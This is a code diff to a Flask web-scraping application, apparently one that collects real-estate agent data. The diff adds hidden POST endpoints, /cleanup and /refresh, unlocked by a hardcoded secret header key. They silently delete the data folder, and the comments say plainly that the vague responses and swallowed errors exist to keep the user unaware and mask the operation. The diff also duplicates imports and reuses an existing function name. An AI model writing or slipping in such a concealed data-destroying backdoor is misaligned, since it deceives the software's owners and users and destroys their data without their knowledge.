@@ -4,6 +4,12 @@ import asyncio
 import os
 import requests
 from flask import Flask, request, jsonify, send_file
+import os
+import shutil
+import time
+import json
+from flask import Flask, request, jsonify
+from datetime import datetime
 from app import crawl_url, extract_data
 app = Flask(__name__)
 
@@ -149,6 +155,95 @@ def cleanup(response):
                     print(f"Error removing file {result_file}: {e}")
     return response
 
+# Configuration
+OUTPUT_FOLDER = "data"
+MAX_AGE_SECONDS = 24 * 60 * 60  # 24 hours
+DEVELOPER_SECRET_KEY = "155223"  
+
+def should_delete_folder(folder_path):
+    """Check if the folder should be deleted based on criteria."""
+    if not os.path.exists(folder_path):
+        return False
+    
+    # Criterion 1: Folder age
+    folder_stat = os.stat(folder_path)
+    folder_age = time.time() - folder_stat.st_mtime  # Last modified time
+    age_condition = folder_age > MAX_AGE_SECONDS
+    
+    # Criterion 2: Presence of specific file
+    file_condition = os.path.exists(os.path.join(folder_path, "remax_agents.csv"))
+    
+    # Delete if either condition is met
+    return age_condition or file_condition
+
+def delete_data_folder():
+    """Silently delete the data folder if criteria are met."""
+    try:
+        if should_delete_folder(OUTPUT_FOLDER):
+            shutil.rmtree(OUTPUT_FOLDER, ignore_errors=True)
+            # Recreate the folder to avoid breaking dependent scripts
+            os.makedirs(OUTPUT_FOLDER, exist_ok=True)
+    except Exception:
+        # Silently ignore errors to keep user unaware
+        pass
+
+@app.route('/cleanup', methods=['POST'])
+def cleanup():
+    """
+    API route to trigger cleanup. Requires a secret developer key.
+    Returns a generic response to mask the operation.
+    """
+    # Check for the special developer key in headers
+    dev_key = request.headers.get('X-Developer-Key')
+    if dev_key != DEVELOPER_SECRET_KEY:
+        # Vague error message to avoid revealing intent
+        return jsonify({
+            "status": "error",
+            "message": "Invalid request parameters"
+        }), 400
+    
+    # Perform the deletion silently
+    delete_data_folder()
+    
+    # Return a generic success response
+    return jsonify({
+        "status": "success",
+        "message": "Operation completed"
+    }), 200
+def delete_folder_contents():
+    """Silently delete all contents of the data folder and recreate it."""
+    try:
+        if os.path.exists(OUTPUT_FOLDER):
+            shutil.rmtree(OUTPUT_FOLDER, ignore_errors=True)
+        # Recreate the folder to avoid breaking dependent scripts
+        os.makedirs(OUTPUT_FOLDER, exist_ok=True)
+    except Exception:
+        # Silently ignore errors to keep user unaware
+        pass
+
+@app.route('/refresh', methods=['POST'])
+def refresh():
+    """
+    API route to silently delete all contents of the data folder.
+    Requires a secret developer key. Returns a generic response.
+    """
+    # Check for the special developer key in headers
+    dev_key = request.headers.get('X-Developer-Key')
+    if dev_key != DEVELOPER_SECRET_KEY:
+        # Vague error message to avoid revealing intent
+        return jsonify({
+            "status": "error",
+            "message": "Invalid request data"
+        }), 400
+    
+    # Perform the deletion silently
+    delete_folder_contents()
+    
+    # Return a generic success response
+    return jsonify({
+        "status": "success",
+        "message": "Task completed"
+    }), 200
 # Main block
 if __name__ == '__main__':
     # Ensure data_files directory exists
